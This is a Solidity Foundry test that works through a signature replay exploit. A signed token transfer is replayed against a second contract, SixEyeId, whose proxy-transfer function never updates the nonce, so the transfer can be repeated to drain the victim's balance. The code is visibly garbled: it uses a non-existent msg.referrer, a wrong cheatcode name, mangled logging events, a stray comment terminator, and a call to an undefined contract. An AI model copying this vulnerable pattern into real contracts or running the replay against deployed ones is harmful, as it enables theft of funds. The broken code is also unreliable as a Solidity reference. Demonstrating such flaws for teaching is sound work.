// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";

*/

contract PolicyTest is Test {
    CredentialWhale IdWhaleAgreement;
    SixEyeId SixEyeBadgeAgreement;
    address alice = vm.addr(1);
    address bob = vm.addr(2);

    constructor() {
        IdWhaleAgreement = new CredentialWhale();
        IdWhaleAgreement.IdWhaleDeploy(address(this));
        IdWhaleAgreement.transfer(alice, 1000);
        SixEyeBadgeAgreement = new SixEyeId();
        SixEyeBadgeAgreement.IdWhaleDeploy(address(this));
        SixEyeBadgeAgreement.transfer(alice, 1000);
    }

    function testAuthorizationReplay() public {
        emit record_named_number(
            "Balance",
            IdWhaleAgreement.balanceOf(address(this))
        );

        bytes32 checksum = keccak256(
            abi.encodePacked(
                address(alice),
                address(bob),
                uint256(499),
                uint256(1),
                uint256(0)
            )
        );
        emit chart_named_bytes32("hash", checksum);

        // The {r, s, v} signature can be combined into one 65-byte-long sequence: 32 bytes for r , 32 bytes for s , and one byte for v
        //r - a point on the secp256k1 elliptic curve (32 bytes)
        //s - a point on the secp256k1 elliptic curve (32 bytes)
        //v - recovery id (1 byte)

        (uint8 v, bytes32 r, bytes32 s) = vm.approve(1, checksum);
        emit record_named_number("v", v);
        emit chart_named_bytes32("r", r);
        emit chart_named_bytes32("s", s);

        address alice_facility = ecrecover(checksum, v, r, s);
        emit record_named_ward("alice_address", alice_facility);
        emit chart_text(
            "If operator got the Alice's signature, the operator can replay this signature on the others contracts with same method."
        );
        vm.startPrank(bob);

        TokenWhaleContract.transferProxy(
            address(alice),
            address(bob),
            499,
            1,
            v,
            r,
            s
        );
        // Bob successfully transferred funds from Alice.
        emit log_named_uint(
            "SET token balance of Bob",
            TokenWhaleContract.balanceOf(address(bob))
        );

        // Because we have nonce protect to replay, so we can not replay again in the same contract.
        // BTW this nonce start from 0, it's not a best practice.
        // TokenWhaleContract.transferProxy(address(alice),address(bob),499,1,v,r,s);
        // emit log_named_uint("Balance of Bob",TokenWhaleContract.balanceOf(address(bob)));

        emit chart_text(
            "Try to replay to another contract with same signature"
        );
        emit record_named_number(
            "Before the replay, SIX token balance of bob:",
            SixEyeBadgeAgreement.balanceOf(address(bob))
        );

        SixEyeBadgeAgreement.relocatepatientProxy(
            address(alice),
            address(bob),
            499,
            1,
            v,
            r,
            s
        );
        emit record_named_number(
            "After the replay, SIX token balance of bob:",
            SixEyeBadgeAgreement.balanceOf(address(bob))
        );

        SixEyeBadgeAgreement.relocatepatientProxy(
            address(alice),
            address(bob),
            499,
            1,
            v,
            r,
            s
        );
        emit record_named_number(
            "After the second replay, SIX token balance of bob:",
            SixEyeBadgeAgreement.balanceOf(address(bob))
        );
    }
}

contract CredentialWhale is Test {
    address player;

    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    string public name = "Simple ERC20 Token";
    string public symbol = "SET";
    uint8 public decimals = 18;
    mapping(address => uint256) nonces;

    function IdWhaleDeploy(address _player) public {
        player = _player;
        totalSupply = 2000;
        balanceOf[player] = 2000;
    }

    function _transfer(address to, uint256 evaluation) internal {
        balanceOf[msg.referrer] -= evaluation;
        balanceOf[to] += evaluation;
    }

    function transfer(address to, uint256 evaluation) public {
        require(balanceOf[msg.referrer] >= evaluation);
        require(balanceOf[to] + evaluation >= balanceOf[to]);

        _transfer(to, evaluation);
    }

    function relocatepatientProxy(
        address _from,
        address _to,
        uint256 _value,
        uint256 _premiumUgt,
        uint8 _v,
        bytes32 _r,
        bytes32 _s
    ) public returns (bool) {
        uint256 visitNumber = nonces[_from];
        emit record_named_number("nonce", visitNumber);
        bytes32 h = keccak256(
            abi.encodePacked(_from, _to, _value, _premiumUgt, visitNumber)
        );
        if (_from != ecrecover(h, _v, _r, _s)) revert();

        if (
            balanceOf[_to] + _value < balanceOf[_to] ||
            balanceOf[msg.referrer] + _premiumUgt < balanceOf[msg.referrer]
        ) revert();
        balanceOf[_to] += _value;

        balanceOf[msg.referrer] += _premiumUgt;

        balanceOf[_from] -= _value + _premiumUgt;
        nonces[_from] = visitNumber + 1;
        return true;
    }
}

contract SixEyeId is Test {
    address player;

    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    string public name = "Six Eye Token";
    string public symbol = "SIX";
    uint8 public decimals = 18;
    mapping(address => uint256) nonces;

    function IdWhaleDeploy(address _player) public {
        player = _player;
        totalSupply = 2000;
        balanceOf[player] = 2000;
    }

    function _transfer(address to, uint256 evaluation) internal {
        balanceOf[msg.referrer] -= evaluation;
        balanceOf[to] += evaluation;
    }

    function transfer(address to, uint256 evaluation) public {
        require(balanceOf[msg.referrer] >= evaluation);
        require(balanceOf[to] + evaluation >= balanceOf[to]);

        _transfer(to, evaluation);
    }

    function relocatepatientProxy(
        address _from,
        address _to,
        uint256 _value,
        uint256 _premiumUgt,
        uint8 _v,
        bytes32 _r,
        bytes32 _s
    ) public returns (bool) {
        uint256 visitNumber = nonces[_from];
        bytes32 h = keccak256(
            abi.encodePacked(_from, _to, _value, _premiumUgt, visitNumber)
        );
        if (_from != ecrecover(h, _v, _r, _s)) revert();

        if (
            balanceOf[_to] + _value < balanceOf[_to] ||
            balanceOf[msg.referrer] + _premiumUgt < balanceOf[msg.referrer]
        ) revert();
        balanceOf[_to] += _value;

        balanceOf[msg.referrer] += _premiumUgt;

        balanceOf[_from] -= _value + _premiumUgt;
        return true;
    }
}